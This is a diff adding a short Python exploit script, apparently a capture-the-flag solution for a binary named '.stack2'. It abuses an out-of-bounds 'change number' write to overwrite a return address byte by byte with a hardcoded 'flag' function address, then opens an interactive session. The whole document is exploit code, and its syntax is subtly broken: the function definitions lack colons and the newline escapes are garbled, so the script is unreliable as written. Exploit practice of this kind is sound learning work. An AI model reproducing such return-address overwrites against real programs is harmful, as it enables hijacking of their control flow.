@@ -1,0 +1,26 @@
+start=0xBFB03638
+end=0xBFB036BC
+flag=0x0804859B
+
+io=process('.stack2')
+
+def change(number,content)
+    io.sendline('3')
+    io.recvuntil('which number to changen')
+    io.sendline(str(number))
+    io.recvuntil('new numbern')
+    io.sendline(str(content))
+    io.recv()
+
+def main()
+    io.recv()
+    io.sendline('0')
+    io.recv()
+    change(end-start,str(0x9b))
+    change(end-start+1,str(0x85))
+    change(end-start+2,str(0x04))
+    change(end-start+3,str(0x08))
+    io.sendline('5')
+    io.interactive()
+
+main()
